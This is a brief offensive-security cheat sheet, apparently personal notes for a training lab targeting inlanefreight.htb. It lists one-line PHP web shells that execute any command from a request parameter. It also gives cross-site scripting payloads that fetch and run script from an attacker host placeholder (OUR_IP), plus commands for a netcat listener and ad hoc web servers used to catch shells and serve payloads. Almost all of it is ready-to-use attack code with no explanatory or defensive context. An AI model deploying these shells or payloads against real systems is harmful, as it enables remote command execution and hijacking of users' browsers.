# WEBSHELL
```php
<?php system($_REQUEST['cmd']); ?>
```

```php
<?php system($_GET["cmd"]); ?>
```
# XSS Testing Payloads
```xss
<script>alert(window.origin)</script>
```

```js
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```
# /etc/hosts
```shell
sudo sh -c "echo '<IP> inlanefreight.htb' >> /etc/hosts" 
```
# PHP Webserver
```php
sudo php -S 0.0.0.0:8000
```
# NETCAT LISTENER
```netcat
sudo nc -nlvp <PORT>
```
# PYTHON WEBSERVER
```python
python3 -m http.server 8001
```
